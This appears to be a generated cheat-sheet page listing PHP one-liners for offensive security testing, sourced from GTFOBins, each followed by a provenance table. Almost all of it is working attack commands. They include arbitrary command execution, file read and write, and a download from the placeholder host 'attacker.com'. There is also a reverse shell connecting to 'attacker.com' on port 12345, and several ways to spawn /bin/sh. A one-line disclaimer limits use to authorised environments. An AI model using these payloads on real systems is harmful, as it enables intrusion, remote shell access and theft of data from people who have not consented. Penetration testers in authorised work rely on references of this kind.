---
parsed_by: focuslocust
source: commands
type: generated
---
# php Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## php

Tool page: [php](../../tools/linux/php.md)

### command

```text
php -r 'echo shell_exec("/path/to/command");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### command

```text
php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### command

```text
php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### download

```text
php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
php -r 'readfile("/path/to/input-file");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
php -r 'file_put_contents("/path/to/output-file", "DATA");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### shell

```text
php -r 'system("/bin/sh -i");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### shell

```text
php -r 'passthru("/bin/sh -i");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### shell

```text
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### shell

```text
php -r 'pcntl_exec("/bin/sh");'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |

### upload

```text
php -S 0.0.0.0:80
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/php` |
| Evidence | Function example preserved from source parser. |
